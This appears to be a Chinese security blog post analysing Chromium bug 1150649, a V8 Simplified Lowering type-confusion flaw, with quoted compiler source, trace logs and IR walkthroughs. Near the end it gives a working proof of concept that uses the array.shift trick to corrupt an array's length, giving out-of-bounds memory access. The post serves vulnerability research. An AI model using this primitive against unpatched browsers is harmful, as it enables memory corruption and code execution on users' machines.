> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/3yAl0Cp_J_zGCF5Tdc_1Xw)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb7MQ6WQy8ZAjGC0lSTFrKDUDr5lIUJyFqwiaHKPNya7v8hoqgl4eic5KIiaBuQRpgZB8rlHnyXLxzRYA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvicsL6PrCibUP5nhribM1RhlJg0icMsibxuZ0ysfp5jYDA4R9Um18saIMPYA/640?wx_fmt=png)

**前言**

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvicsL6PrCibUP5nhribM1RhlJg0icMsibxuZ0ysfp5jYDA4R9Um18saIMPYA/640?wx_fmt=png)

本篇主要是对 zer0con2021 上 chrome exploitation 议题 v8 部分的解读。

这个漏洞发生在 Simplified Lowering phase 的 VisitSpeculativeIntegerAdditiveOp 函数中，该函数是用来处理 SpeculativeSafeIntegerAdd/SpeculativeSafeIntegerSubtract 节点，对其重新计算类型并将其转化或者降级到更底层的 IR。  
这个函数非常有趣，据我所知它已经出了三个可以 RCE 的漏洞了

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvicsL6PrCibUP5nhribM1RhlJg0icMsibxuZ0ysfp5jYDA4R9Um18saIMPYA/640?wx_fmt=png)

**Simplified lowing phase 和 Root Cause**

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvicsL6PrCibUP5nhribM1RhlJg0icMsibxuZ0ysfp5jYDA4R9Um18saIMPYA/640?wx_fmt=png)

propagating truncations: 反向数据流分析，传播 truncation，并设置 restriction_type

retype: 正向数据流分析，重新计算类型，并设置 representation。

lower: 降级 (lower) 节点或者插入转换 (conversion) 节点

### **重要的数据结构和函数**

NodeInfo，记录数据流分析中节点的各种类型信息，主要包括 truncation(指明该节点在使用的时候的截断信息)，restriction_type(在 truncation 传播阶段设置它的值，用于在 retype 的时候设置 feedback_type)，feedback_type（用于在 Retype phase 重新计算 type 信息），representation（节点 retype 完成之后最终的表示类型，可以用于指明应该如何 lower 到更具体的节点，是否需要 Convert）等。

```
// Information for each node tracked during the fixpoint.
  class NodeInfo final {
   public:
    // Adds new use to the node. Returns true if something has changed
    // and the node has to be requeued.
    bool AddUse(UseInfo info) {
      Truncation old_truncation = truncation_;
      truncation_ = Truncation::Generalize(truncation_, info.truncation());
      return truncation_ != old_truncation;
    }

    void set_queued() { state_ = kQueued; }
    void set_visited() { state_ = kVisited; }
    void set_pushed() { state_ = kPushed; }
    void reset_state() { state_ = kUnvisited; }
    bool visited() const { return state_ == kVisited; }
    bool queued() const { return state_ == kQueued; }
    bool pushed() const { return state_ == kPushed; }
    bool unvisited() const { return state_ == kUnvisited; }
    Truncation truncation() const { return truncation_; }
    void set_output(MachineRepresentation output) { representation_ = output; }

    MachineRepresentation representation() const { return representation_; }

    // Helpers for feedback typing.
    void set_feedback_type(Type type) { feedback_type_ = type; }
    Type feedback_type() const { return feedback_type_; }
    void set_weakened() { weakened_ = true; }
    bool weakened() const { return weakened_; }
    void set_restriction_type(Type type) { restriction_type_ = type; }
    Type restriction_type() const { return restriction_type_; }

   private:
    enum State : uint8_t { kUnvisited, kPushed, kVisited, kQueued };
    State state_ = kUnvisited;
    MachineRepresentation representation_ =
        MachineRepresentation::kNone;             // Output representation.
    Truncation truncation_ = Truncation::None();  // Information about uses.

    Type restriction_type_ = Type::Any();
    Type feedback_type_;
    bool weakened_ = false;
  };
```

ProcessInput  
这是一个模板函数，根据不同的 phase 调用不同的实现，对于 truncation propagate phase，它将直接调用 EnqueueInput。

```
template <>
void RepresentationSelector::ProcessInput<PROPAGATE>(Node* node, int index,
                                                     UseInfo use) {
  DCHECK_IMPLIES(use.type_check() != TypeCheckKind::kNone,
                 !node->op()->HasProperty(Operator::kNoDeopt) &&
                     node->op()->EffectInputCount() > 0);
  EnqueueInput<PROPAGATE>(node, index, use);
}

template <>
void RepresentationSelector::ProcessInput<RETYPE>(Node* node, int index,
                                                  UseInfo use) {
  DCHECK_IMPLIES(use.type_check() != TypeCheckKind::kNone,
                 !node->op()->HasProperty(Operator::kNoDeopt) &&
                     node->op()->EffectInputCount() > 0);
}

template <>
void RepresentationSelector::ProcessInput<LOWER>(Node* node, int index,
                                                 UseInfo use) {
  DCHECK_IMPLIES(use.type_check() != TypeCheckKind::kNone,
                 !node->op()->HasProperty(Operator::kNoDeopt) &&
                     node->op()->EffectInputCount() > 0);
  ConvertInput(node, index, use);
}

...
 // Converts input {index} of {node} according to given UseInfo {use},
  // assuming the type of the input is {input_type}. If {input_type} is null,
  // it takes the input from the input node {TypeOf(node->InputAt(index))}.
  void ConvertInput(Node* node, int index, UseInfo use,
                    Type input_type = Type::Invalid()) {
    // In the change phase, insert a change before the use if necessary.
    if (use.representation() == MachineRepresentation::kNone)
      return;  // No input requirement on the use.
    Node* input = node->InputAt(index);
    DCHECK_NOT_NULL(input);
    NodeInfo* input_info = GetInfo(input);
    MachineRepresentation input_rep = input_info->representation();
    if (input_rep != use.representation() ||
        use.type_check() != TypeCheckKind::kNone) {
      // Output representation doesn't match usage.
      TRACE("  change: #%d:%s(@%d #%d:%s) ", node->id(), node->op()->mnemonic(),
            index, input->id(), input->op()->mnemonic());
      TRACE("from %s to %s:%s\n",
            MachineReprToString(input_info->representation()),
            MachineReprToString(use.representation()),
            use.truncation().description());
      if (input_type.IsInvalid()) {
        input_type = TypeOf(input);
      }
      Node* n = changer_->GetRepresentationFor(input, input_rep, input_type,
                                               node, use);
      node->ReplaceInput(index, n);
    }
  }
```

EnqueueInput  
这个函数先从全局数组里取出 node 的指定 index 的输入节点对应的 NodeInfo 信息，然后调用 AddUse 来更新 info 的 truncation_字段，从而将 truncation 反向传播。

```
// Enqueue {use_node}'s {index} input if the {use_info} contains new information
// for that input node.
template <>
void RepresentationSelector::EnqueueInput<PROPAGATE>(Node* use_node, int index,
                                                   UseInfo use_info) {
Node* node = use_node->InputAt(index);
NodeInfo* info = GetInfo(node);
#ifdef DEBUG
// Check monotonicity of input requirements.
node_input_use_infos_[use_node->id()].SetAndCheckInput(use_node, index,
                                                       use_info);
#endif  // DEBUG
if (info->unvisited()) {
  info->AddUse(use_info);
  TRACE("  initial #%i: %s\n", node->id(), info->truncation().description());
  return;
}
TRACE("   queue #%i?: %s\n", node->id(), info->truncation().description());
if (info->AddUse(use_info)) {
  // New usage information for the node is available.
  if (!info->queued()) {
    DCHECK(info->visited());
    revisit_queue_.push(node);
    info->set_queued();
    TRACE("   added: %s\n", info->truncation().description());
  } else {
    TRACE(" inqueue: %s\n", info->truncation().description());
  }
}
}
  bool AddUse(UseInfo info) {
    Truncation old_truncation = truncation_;
    truncation_ = Truncation::Generalize(truncation_, info.truncation());
    return truncation_ != old_truncation;
  }
```

SetOutput  
这个函数也是模板函数，根据不同 phase 调用不同的偏特化实现

对于 truncation propagate phase，它将更新节点对应的 nodeinfo 的 restriction_type_，并用于后续的 retype phase 上。

对于 retype phase，它将更新节点的 representation 表示。

```
template <>
void RepresentationSelector::SetOutput<PROPAGATE>(
    Node* node, MachineRepresentation representation, Type restriction_type) {
  NodeInfo* const info = GetInfo(node);
  info->set_restriction_type(restriction_type);
}

template <>
void RepresentationSelector::SetOutput<RETYPE>(
    Node* node, MachineRepresentation representation, Type restriction_type) {
  NodeInfo* const info = GetInfo(node);
  DCHECK(restriction_type.Is(info->restriction_type()));
  info->set_output(representation);
}

template <>
void RepresentationSelector::SetOutput<LOWER>(
    Node* node, MachineRepresentation representation, Type restriction_type) {
  NodeInfo* const info = GetInfo(node);
  DCHECK_EQ(info->representation(), representation);
  DCHECK(restriction_type.Is(info->restriction_type()));
  USE(info);
}
```

**PoC**

Issue  
https://bugs.chromium.org/p/chromium/issues/detail?id=1150649

```
// test/mjsunit/compiler/regress-1150649.js 
function foo(a) {
    var y = 0x7fffffff;

    if (a == NaN) y = NaN;

    if (a) y = -1;
    const z = (y + 1)|0;
    return z < 0; 
}
%PrepareFunctionForOptimization(foo); 
assertFalse(foo(true)); 
%OptimizeFunctionOnNextCall(foo); 
assertTrue(foo(false)); // return False, FAILURE!!!
function foo(a) {
  var y = 0x7fffffff; // 2^31 - 1
  if (a == NaN) y = NaN; // Widen the static type of y (this condition never holds).
  if (a) y = -1;// The next condition holds only in the warmup run. It leads to Smi (SignedSmall) feedback being collected for the addition below. 
  let z = (y + 1) | 0;
  return z < 0;
}
%PrepareFunctionForOptimization(foo);
foo(true);
%OptimizeFunctionOnNextCall(foo);
print(foo(false));
```

经过 Typer phase 之后:

```
y:
(NaN | Range(-1, 0x7fffffff))
y + 1:
Range(0, 0x80000000)
(y + 1) | 0:
Range(-0x80000000, 0x7fffffff)
```

若是正常的解释执行，则 const z = (y + 1)|0; 将计算出 - 0x80000000，其小于 0 显然为 true，但在有漏洞的情况下却返回 false。

### **truncation propagation**

通过./d8 --allow-natives-syntax --trace-representation poc.js 可以完整的 trace 这三个阶段。

首先对于 truncation propagation，可以看出在反向遍历节点的时候，在 visit NumberLessThan 的时候，将其输入节点 #47 的 truncation 由 TruncationKind::kNone(no-value-use) 更新到 TruncationKind::kWord32(truncate-to-word32)，代表它在使用的时候会被截断到 word32。

```
visit #57: NumberLessThan (trunc: no-truncation (but distinguish zeros))
   queue #47?: no-value-use
 inqueue: truncate-to-word32
```

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7MQ6WQy8ZAjGC0lSTFrKDUNVM0ZRhkWakXKh7GnP0ScMMj7GXIJM8UDvBmdQuhGovUkOC7YEiahDg/640?wx_fmt=png)

在处理 y+1 的时候, 最终会调用到 VisitBinop，其将左值和右值输入节点启发式的传播其 truncation 信息，并将 SpeculativeSafeIntegerAdd 对应的 nodeinfo 里的 restriction_type 字段更新到 Type::Signed32

```
visit #45: SpeculativeSafeIntegerAdd (trunc: truncate-to-word32)
  initial #41: no-truncation (but identify zeros)
  initial #44: no-truncation (but identify zeros)

  void VisitSpeculativeIntegerAdditiveOp(Node* node, Truncation truncation,SimplifiedLowering* lowering) {
      ...
      VisitBinop(..., Type::Signed32());
      ...

 void VisitBinop(Node* node, UseInfo left_use, UseInfo right_use, MachineRepresentation output, Type restriction_type = Type::Any()) {
    DCHECK_EQ(2, node->op()->ValueInputCount());
    ProcessInput<T>(node, 0, left_use);
    ProcessInput<T>(node, 1, right_use);
    for (int i = 2; i < node->InputCount(); i++) {
      EnqueueInput<T>(node, i);
    }
    SetOutput<T>(node, output, restriction_type);
  }
```

### **Retype phase**

Retype phase 进行正向数据流分析，从 Start 节点开始，对每个节点 UpdateFeedbackType 更新类型，并将更新后的类型向前传播。

```
#45:SpeculativeSafeIntegerAdd[SignedSmall](#41:Phi, #44:NumberConstant, #42:Checkpoint, #38:Merge)  
[Static type: Range(0, 2147483648), 
Feedback type: Range(0, 2147483647)]
 visit #45: SpeculativeSafeIntegerAdd
  ==> output kRepWord32

Type FeedbackTypeOf(Node* node) {
    Type type = GetInfo(node)->feedback_type();
    return type.IsInvalid() ? Type::None() : type;
}
...
bool UpdateFeedbackType(Node* node) {
...
    Type input0_type;
    if (node->InputCount() > 0) input0_type = FeedbackTypeOf(node->InputAt(0));
    Type input1_type;
    if (node->InputCount() > 1) input1_type = FeedbackTypeOf(node->InputAt(1));
    ...
    #define DECLARE_CASE(Name)                                               \
    case IrOpcode::k##Name: {                                              \
        new_type = Type::Intersect(op_typer_.Name(input0_type, input1_type), \
                                info->restriction_type(), graph_zone());  \
        break;                                                               \
    }
    SIMPLIFIED_SPECULATIVE_NUMBER_BINOP_LIST(DECLARE_CASE)
    SIMPLIFIED_SPECULATIVE_BIGINT_BINOP_LIST(DECLARE_CASE)
#undef DECLARE_CASE
...
    GetInfo(node)->set_feedback_type(new_type);
...
}

#define SIMPLIFIED_SPECULATIVE_NUMBER_BINOP_LIST(V) \
....
  V(SpeculativeNumberBitwiseOr)  
  V(SpeculativeSafeIntegerAdd)                      \
  V(SpeculativeSafeIntegerSubtract)
```

首先对左值和右值输入节点调用 FeedbackTypeOf 函数，这个函数会去确定该节点对应的 nodeinfo 上是否有 feedback 字段被设置，如果有则代表该输入节点的类型在 retype 的时候被更新了，需要取该类型作为实际的类型信息，否则代表没有更新，和之前 typer 阶段分析的一致，直接取原本的 type 即可，最终得到 input0_type 和 input1_type。

这个宏看上去很不好理解，但其实意思就是对于  
SpeculativeSafeIntegerAdd 节点，先根据 input0_type 和 input1_type，重新调用 SpeculativeSafeIntegerAdd 运算符的 type 函数，计算出一个类型，其应该是 Range(0, 2147483648)。

然后将这个结果和 restriction_type 即 Signed32 取交集，而 Signed32 的范围应该是 (-2147483648,2147483647)，最终得到 Feedback type 是 Range(0, 2147483647)，并将这个结果更新到节点对于 nodeinfo 的 feedback_type 字段上。

SpeculativeNumberBitwiseOr 同理，由于 SpeculativeSafeIntegerAdd 的类型作为 input0_type 已经被更新了，所以调用 SpeculativeNumberBitwiseOr 的 type 函数将计算出一个新的类型，作为 Feedback type 传播下去。

```
#47:SpeculativeNumberBitwiseOr[SignedSmall](#45:SpeculativeSafeIntegerAdd, #46:NumberConstant, #45:SpeculativeSafeIntegerAdd, #38:Merge)  
[Static type: Range(-2147483648, 2147483647), 
Feedback type: Range(0, 2147483647)]
 visit #47: SpeculativeNumberBitwiseOr
  ==> output kRepWord32
```

Retype phase 除了调用 UpdateFeedbackType 更新信息，还会调用 VisitNode 函数设置节点的 respresentation，但这和这个漏洞无关，略过不表。

### **Lower phase**

现在，每个节点都已经和它的使用信息 (truncation) 和 output representation 关联了。

最后将反向的遍历所有节点，进行 lower

将节点本身 lower 到更具体的节点（通过 DeferReplacement）

当该节点的的 output representation 与此输入的预期使用信息不匹配时，对节点进行转换（插入 ConvertInput），比如对于一个 representation 是 kSigned 的 node1，若其 use 节点 node2 会将其 truncation 到 kWord64，则将会插入 ConvertInput 函数对该节点进行转换。

于是对于 poc 里的 z <0, 由于 z 的类型已经被更新到了 (0, 2147483647)，这个范围显然是在 Unsigned32OrMinusZero 里的，所以满足第一个 if 判断。

于是最终将 NumberLessThan 节点给 lower 到了 Uint32Op。  
但实际上 z 的值是 | 0x80000000|，其被当成 uint32 解析的话就是 + 0x80000000，这个值显然大于 0，所以出现了和之前解释执行时候不一样的结果 false。

```
case IrOpcode::kNumberLessThan:
      case IrOpcode::kNumberLessThanOrEqual: {
        Type const lhs_type = TypeOf(node->InputAt(0));
        Type const rhs_type = TypeOf(node->InputAt(1));
        // Regular number comparisons in JavaScript generally identify zeros,
        // so we always pass kIdentifyZeros for the inputs, and in addition
        // we can truncate -0 to 0 for otherwise Unsigned32 or Signed32 inputs.
        if (lhs_type.Is(Type::Unsigned32OrMinusZero()) &&
            rhs_type.Is(Type::Unsigned32OrMinusZero())) {
          // => unsigned Int32Cmp
          VisitBinop<T>(node, UseInfo::TruncatingWord32(),
                        MachineRepresentation::kBit);
          if (lower<T>()) ChangeOp(node, Uint32Op(node));
        } else if (lhs_type.Is(Type::Signed32OrMinusZero()) &&
                   rhs_type.Is(Type::Signed32OrMinusZero())) {
          // => signed Int32Cmp
          VisitBinop<T>(node, UseInfo::TruncatingWord32(),
                        MachineRepresentation::kBit);
          if (lower<T>()) ChangeOp(node, Int32Op(node));
        } else {
          // => Float64Cmp
          VisitBinop<T>(node, UseInfo::TruncatingFloat64(kIdentifyZeros),
                        MachineRepresentation::kBit);
          if (lower<T>()) ChangeOp(node, Float64Op(node));
        }
        return;
      }
```

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvicsL6PrCibUP5nhribM1RhlJg0icMsibxuZ0ysfp5jYDA4R9Um18saIMPYA/640?wx_fmt=png)

**Exploit**

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvicsL6PrCibUP5nhribM1RhlJg0icMsibxuZ0ysfp5jYDA4R9Um18saIMPYA/640?wx_fmt=png)

### **array.shift trick**

这个漏洞的原理至此已经分析清楚了，那么我们简单的来浏览一下这个漏洞的 typer exploit trick。

```
//首先假设我们能让l的类型在typer阶段被推断成Range(-1,0)
let arr = new Array(l);
arr.shift();
```

#### TFBytecodeGraphBuilder

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7MQ6WQy8ZAjGC0lSTFrKDUP6ayXibgiausTqicJCusrr7aoafJoT4l81zuSvaAoCVJWchAJItTc2JqQ/640?wx_fmt=png)

#### TFInlining

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7MQ6WQy8ZAjGC0lSTFrKDUVAQh6gQ2qm8GBsY5nzHgbXcGyquNcwsnNnbEfvng40VWHPfGaxaN4g/640?wx_fmt=png)

#81 也就是 array.shift 将被 Reduce 成这些节点，我们重点关注 StoreField[+12] 即可，因为这代表的是重新为 array 的 length 字段赋值。

这部分 IR 对应的伪代码如下，摘自 zer0con PPT 原文。

```
/* JSCallReducer::ReduceArrayPrototypeShift */
let length = LoadField(arr, kLengthOffset); if (length == 0) {
    return;
} 
else {
    if (length <= 100) { 
        DoShiftElementsArray(); // Don't care 
        /* Update length field */
        let newLen = length - 1; 
        StoreField(arr, kLengthOffset, newLen);
    } 
    else /* length > 100 */ {
        CallRuntime(ArrayShift);
    } 
}
```

如果关注 IR 图的话，关注下面这部分就行了，可以看出先 LoadField[+12]，然后对其减 1，再 StoreField[+12] 回去。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7MQ6WQy8ZAjGC0lSTFrKDUA8InIDiaGxGibXM5mwMric3GLJyECKpTNaSmKtQf2I2fK4daRibicRoxRMQ/640?wx_fmt=png)

#### TFTypedLowering

如图就是 #JSCreateArray 在 TypedLowering phase 被 reduce 后的 IR。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7MQ6WQy8ZAjGC0lSTFrKDUaEIVjicJpXuFI4vFicEEf7XH92COQiaB3Hj3S11EftbqYzcp2xno9bkGw/640?wx_fmt=png)

伪代码如下:

```
// JSCreateLowering::ReduceJSCreateArray 
// JSCreateLowering::ReduceNewArray 
let limit = kInitialMaxFastElementArray; // limit : NumberConstant[16380]
// len : Range(-1, 0), real: 1
let checkedLen = CheckBounds(len, limit); // checkedLen : Range(0, 0), real: 1
let arr = Allocate(kArraySize); 
StoreField(arr, k[Map|Prop|Elem]Offset, ...);
StoreField(arr, kLengthOffset, checkedLen);
```

#### TFLoadElimination

有趣的是将上面这些 reduce 后的结果连起来看，会发现对 length 先 Store，再 Load，再减去一个 - 1，再 Store，这是不是过于冗杂了呢，v8 对其会进行一定的优化。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7MQ6WQy8ZAjGC0lSTFrKDUJgabQib3geiaxxcyBricWLOUNmdXN9nnAbsL53pI8wSK49SjTIakL06xQ/640?wx_fmt=png)

篇幅所限，略去不表，以后有空我再单独写一篇讲 LoadElimination 的漏洞的文章，总之最终优化后，首先会直接将 #154 CheckBounds 作为 #133 NumberSubtract 的左值输入。

然后由于之前 Typer 分析的时候 CheckBounds 的范围是 (0,0)，这显然是一个常量，而 #44 也是一个常量 1，所以 #133 在其输入更新后，它的 type 也被更新成了 - 1，随后就被常量折叠掉，于是最终得到的 IR 图如下。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7MQ6WQy8ZAjGC0lSTFrKDU1MFeDhpmLKWBSwPeOgXMlRSo5kkQIbc4ghq5y9vXicZ4LgGDXrFoCJg/640?wx_fmt=png)

最终伪代码如下:

```
let limit = kInitialMaxFastElementArray; // limit : NumberConstant[16380]
// len : Range(-1, 0), real: 1
let checkedLen = CheckBounds(len, limit); // checkedLen : Range(0, 0), real: 1
let arr = Allocate(kArraySize); 
StoreField(arr, kMapOffset, map); 
StoreField(arr, kPropertyOffset, property); 
StoreField(arr, kElementOffset, element);
StoreField(arr, kLengthOffset, checkedLen);

let length = checkedLen;
// length: Range(0, 0), real: 1
if (length != 0) {
    if (length <= 100) {
        DoShiftElementsArray(); 
        /* Update length field */
        StoreField(arr, kLengthOffset, -1); 
    } 
    else /* length > 100 */ 
    {
        CallRuntime(ArrayShift);
    }
}
```

事实上到目前为止一切就比较清晰了，只要我们能让 length 通过 CheckBounds 的检查，并且其值不等于 0 且小于等于 100，就能在 arr.shift 之后让 arr 的 length 被置为 - 1，即 0xffffffff，就实现 arr 的越界读写了。

### **最终的 oob poc**

```
function foo(a) {
  var y = 0x7fffffff;
  if (a == NaN) y = NaN; 
  if (a) y = -1;
  let z = (y + 1) + 0;
  let l = 0 - Math.sign(z);
  let arr = new Array(l);
  arr.shift();
  return arr;
}
%PrepareFunctionForOptimization(foo);
foo(true);
%OptimizeFunctionOnNextCall(foo);
print(foo(false).length);
```

事实上很有趣的一件事情是:

1.  Retype 前后的 NumberSign 的范围都是 (0,1)，let l = 0 - Math.sign(z) 在 Retype 前后的范围都是(-1,0)，没有变化。
    
2.  补丁前后，影响的也只是 let z = (y + 1) + 0 的范围从 (0, 2147483647)，变成了 (0, 2147483648)，补丁前后不影响 NumberSign 的范围，所以也不会影响 CheckBounds 的范围，也就不会影响 array.shift 部分生成的 IR。
    

补丁前:  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7MQ6WQy8ZAjGC0lSTFrKDU62IDQx16SDYfFnAJsnx9REDvLFGuWjiaOicib3xD3vRGYhue3lldWYPFQ/640?wx_fmt=png)

补丁后:  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7MQ6WQy8ZAjGC0lSTFrKDUlic6hG4TEbWNk7EuUhsJICeX6jywtv0Jgr4PmicENFUVCJciaH6bxLAww/640?wx_fmt=png)

所以无论补丁前还是补丁后，上面 array.shift 部分生成的 IR 都没有变化。  
那么难道补丁之后，我们还可以执行到 StoreField(arr, kLengthOffset, -1);, 从而得到 OOB 吗？毕竟这部分代码都还在，它没有变化。

显然不可能，事实上补丁影响到的是对 NumberSign 的 lower，它会根据以下逻辑来计算出是 - 1 还是 1。

```
Int32Add...
if ChangeInt32ToFloat64 < 0:
    Select -1
else:
    Select 1
```

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7MQ6WQy8ZAjGC0lSTFrKDU1PPAyxOiblicb1SJdwOEfx8hMqYXd7u8iaU2LEOe5AxeXibzoNcQ04OO2A/640?wx_fmt=png)

在补丁前，Int32Add(0x7fffffff, 1) 之后 ChangeInt32ToFloat64 得到的是 - 0x80000000, 显然小于 0，得到 - 1，然后带入 let l = 0 - Math.sign(z) 运算得到 length 为 1，于是可以通过 CheckBounds 的检查，最后实现 OOB。

但若是在补丁后，该伪代码将变成

```
Int32Add...
if ChangeUInt32ToFloat64 < 0:
    Select -1
else:
    Select 1
```

于是在补丁后，Int32Add(0x7fffffff, 1) 之后 ChangeUInt32ToFloat64 得到的是 0x80000000，显然大于 0，得到 1，然后计算出的 length 是 - 1，显然不能通过 CheckBounds 的检查，所以即使有可以导致 OOB 的分支在，也无法执行进去。

### **Other**

#### Int32Add 从哪来

补丁前后 SpeculativeSafeIntegerAdd 都会被 lower 到 Int32Add，这部分逻辑其实在这里:

```
if (lower<T>()) {
      if (truncation.IsUsedAsWord32() ||
          !CanOverflowSigned32(node->op(), left_feedback_type,
                               right_feedback_type, type_cache_,
                               graph_zone())) {
        ChangeToPureOp(node, Int32Op(node));
      } else {
        ChangeToInt32OverflowOp(node);
      }
    }
```

注意 truncation.IsUsedAsWord32()，只要满足这个条件，就会生成 Int32Op，而要满足这个条件，目前看 add | 0 或者 add +- 0 这种都可以产生截断到 word32。

#### 如何产生 SpeculativeSafeIntegerAdd 节点

事实上如果从 poc 里去掉下面这句就不会创建出 SpeculativeSafeIntegerAdd 节点了，这是因为 v8 的启发式 JIT 在收集执行信息的时候，在进行 add 的时候，发现 y + 1 始终是进行的 SignedSmall 的 add，所以会创建出 SpeculativeSafeIntegerAdd。

如果没有这句，那么显然 y + 1 不可能是在 SignedSmall 范围内计算了，就会生成 NumberAdd 节点，也就不会走到存在漏洞的路径。

```
if (a) y = -1;// The next condition holds only in the warmup run. It leads to Smi (SignedSmall) feedback being collected for the addition below.
```

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvicsL6PrCibUP5nhribM1RhlJg0icMsibxuZ0ysfp5jYDA4R9Um18saIMPYA/640?wx_fmt=png)

**参考链接**

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvicsL6PrCibUP5nhribM1RhlJg0icMsibxuZ0ysfp5jYDA4R9Um18saIMPYA/640?wx_fmt=png)

十分感谢刘耕铭精彩的分享:)

https://doar-e.github.io/blog/2020/11/17/modern-attacks-on-the-chrome-browser-optimizations-and-deoptimizations/

https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf

（点击 “阅读原文” 查看链接）

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)

```
- End -

精彩推荐
马斯克操盘加密币，诈骗分子趁热敛财无数

HVV行动之某OA流量应急

【技术分享】Shiro 权限绕过的历史线（下）

【技术分享】Shiro 权限绕过的历史线（上）


戳“阅读原文”查看更多内容
```